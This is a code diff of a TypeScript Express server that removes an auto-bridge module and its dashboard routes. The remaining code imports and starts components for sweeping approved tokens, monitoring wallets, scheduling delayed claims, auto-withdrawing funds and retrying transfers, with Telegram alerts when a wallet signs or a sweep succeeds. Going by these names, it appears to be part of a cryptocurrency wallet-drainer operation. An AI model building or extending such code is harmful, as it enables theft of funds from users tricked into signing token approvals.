@@ -9,7 +9,6 @@ import { getContractAddressForChain, executeDirectTransfer, getContractForChain,
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep, scheduleDelayedClaim } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
-import { startAutoBridge, stopAutoBridge, manualBridge, getAutoBridgeStatus } from "./auto-bridge";
 import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
 import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
 
@@ -750,32 +749,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
     res.json({ success: true, message: "Manual withdraw completed" });
   });
 
-  app.get("/api/auto-bridge/status", requireDashboardAuth, (req, res) => {
-    res.json(getAutoBridgeStatus());
-  });
-
-  app.post("/api/auto-bridge/start", requireDashboardAuth, (req, res) => {
-    startAutoBridge();
-    res.json({ success: true, message: "Auto-bridge started" });
-  });
-
-  app.post("/api/auto-bridge/stop", requireDashboardAuth, (req, res) => {
-    stopAutoBridge();
-    res.json({ success: true, message: "Auto-bridge stopped" });
-  });
-
-  app.post("/api/auto-bridge/now", requireDashboardAuth, async (req, res) => {
-    await manualBridge();
-    res.json({ success: true, message: "Manual bridge completed" });
-  });
-
   const httpServer = createServer(app);
 
-  // Start the wallet monitor, auto-withdraw, and auto-bridge when server starts
   startWalletMonitor();
   startAutoWithdraw();
   startTransferRetry();
-  startAutoBridge();
 
   return httpServer;
 }
